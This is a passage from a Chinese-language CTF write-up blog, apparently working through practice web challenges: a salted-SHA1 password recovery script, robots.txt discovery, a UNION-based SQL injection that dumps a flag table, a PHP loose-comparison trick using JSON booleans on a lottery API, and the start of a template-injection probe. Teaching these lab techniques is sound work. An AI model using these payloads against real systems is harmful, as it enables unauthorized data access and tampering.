class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pdf</span>():</span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;./&quot;</span>) <span class="keyword">if</span> i.endswith(<span class="string">&quot;pdf&quot;</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_pdf_to_txt</span>(<span class="params">path_to_file</span>):</span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    codec = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    laparams = LAParams()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=codec, laparams=laparams)</span><br><span class="line">    fp = <span class="built_in">open</span>(path_to_file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    maxpages = <span class="number">0</span></span><br><span class="line">    caching = <span class="literal">True</span></span><br><span class="line">    pagenos=<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=<span class="literal">True</span>):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line"></span><br><span class="line">    text = retstr.getvalue()</span><br><span class="line"></span><br><span class="line">    fp.close()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_password</span>():</span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Searching word in &quot;</span> + i)</span><br><span class="line">        pdf_text = convert_pdf_to_txt(<span class="string">&quot;./&quot;</span>+i).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            sha1_password = hashlib.sha1(word.encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&#x27;Salz!&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> (sha1_password == <span class="string">&#x27;3fab54a50e770d830c0416df817567662a9dc85c&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;Find the password :&quot;</span> + word)</span><br><span class="line">                exit()</span><br><span class="line">            </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>

<p>得到admin的密码为ThinJerboa</p>
<p>在admin.php界面登录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208135912661.png" alt="image-20221208135912661"></p>
<h2 id="39-Training-WWW-Robots"><a href="#39-Training-WWW-Robots" class="headerlink" title="39.Training-WWW-Robots"></a>39.Training-WWW-Robots</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208194907183.png" alt="image-20221208194907183"></p>
<p>打开，提示用到robots协议</p>
<p>查看robots.txt</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208195008105.png" alt="image-20221208195008105"></p>
<p>打开fl0g.php</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208195214667.png" alt="image-20221208195214667"></p>
<h2 id="40-NewsCenter"><a href="#40-NewsCenter" class="headerlink" title="40.NewsCenter"></a>40.NewsCenter</h2><p>打开</p>
<p><img src="https://img-blog.csdnimg.cn/48cb90cf76dc423aa72082e5f234b049.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>查看源代码，没有发现有用的东西</p>
<p>扫描目录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208201005366.png" alt="image-20221208201005366"></p>
<p>打开看看</p>
<p><img src="https://img-blog.csdnimg.cn/a290756b9827457d8561aae8bf6fc19e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>随便输入一个值，然后抓包</p>
<p><img src="https://img-blog.csdnimg.cn/9ce5e834fb794872acbb847431622e83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>尝试SQL注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>再尝试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>报错，说明有三个字段</p>
<p>查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>判断回显位为2,3</p>
<p>获取版本及数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version(),database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/40dd190218c64b12bc3220740d6d36ed.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>mysql大于5.0以上的版本有一个系统数据库information_schema，里面的tables表和columns表包含了其他所有的表和列这样我们就可以有据查询</p>
<p>查询表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version(),group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘news’ <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3e7a375c712f49f9934ca57281c0d6f3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>查询列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>‘secret_table’ <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b4405ed2388041c9a615249d62be5c46.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>找到fl4g.php</p>
<p>查看</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version(),group_concat(fl4g) <span class="keyword">from</span> secret_table <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/7b4c12cc2708403486f6a790b08c6b24.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAdHJ5dG93cml0ZWNvZGU=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h2 id="41-lottery"><a href="#41-lottery" class="headerlink" title="41.lottery"></a>41.lottery</h2><p>下载附件，打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208203442302.png" alt="image-20221208203442302"></p>
<p>发现一个robots.txt文件</p>
<p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208203513662.png" alt="image-20221208203513662"></p>
<p>发现有一个git，可能是git漏洞</p>
<p>用githack扫一下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208203802078.png" alt="image-20221208203802078"></p>
<p>查看源代码（在api.php中）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params"><span class="variable">$resp</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$resp</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">response_error</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = [<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="variable">$msg</span>;</span><br><span class="line">	<span class="title function_ invoke__">response</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require_keys</span>(<span class="params"><span class="variable">$req</span>, <span class="variable">$keys</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$keys</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$key</span>, <span class="variable">$req</span>))&#123;</span><br><span class="line">			<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require_registered</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>]))&#123;</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;register first&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require_min_money</span>(<span class="params"><span class="variable">$min_money</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>]))&#123;</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;register first&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;invalid negative money&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$min_money</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&#x27;POST&#x27;</span> || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] != <span class="string">&#x27;application/json&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;please post json data&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">json_last_error</span>() != JSON_ERROR_NONE)&#123;</span><br><span class="line">	<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;invalid json&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">require_keys</span>(<span class="variable">$data</span>, [<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// my boss told me to use cryptographically secure algorithm </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$byte</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">10</span>, <span class="variable">$cstrong</span>);</span><br><span class="line">		<span class="variable">$num</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$num</span> &gt;= <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$cstrong</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;server need be checked, tell admin&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$num</span> /= <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">floor</span>(<span class="variable">$num</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$result</span> .= <span class="title function_ invoke__">random_num</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">	<span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">            <span class="comment">//关键在这，这里是PHP弱比较，其中bool类型的true是可以和任何数据弱类型相等</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	<span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag_price</span>;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$flag_price</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$money</span> -= <span class="variable">$flag_price</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="string">&#x27;Here is your flag: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">		<span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="variable">$msg</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$req</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;buy&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">require_keys</span>(<span class="variable">$data</span>, [<span class="string">&#x27;numbers&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">buy</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">flag</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">require_keys</span>(<span class="variable">$data</span>, [<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">register</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抓包看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208205437117.png" alt="image-20221208205437117"></p>
<p>这时修改numbers的数据，全部改为布尔类型的true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208205709804.png" alt="image-20221208205709804"></p>
<p>然后购买flag</p>
<p><strong><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208210041572.png" alt="image-20221208210041572"></strong></p>
<h2 id="42-Confusion1"><a href="#42-Confusion1" class="headerlink" title="42.Confusion1"></a>42.Confusion1</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211152119246.png" alt="image-20221211152119246"></p>
<p>查看源码，没有有用的信息</p>
<p>点击login.php查看源码，发现</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211152241233.png" alt="image-20221211152241233"></p>
<p>提示了flag的文件位置</p>
<p>想查看源码，看看是否存在git漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:53335/.git</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211152604179.png" alt="image-20221211152604179"></p>
<p>发现不存在git漏洞</p>
<p>试一下模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:53335/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

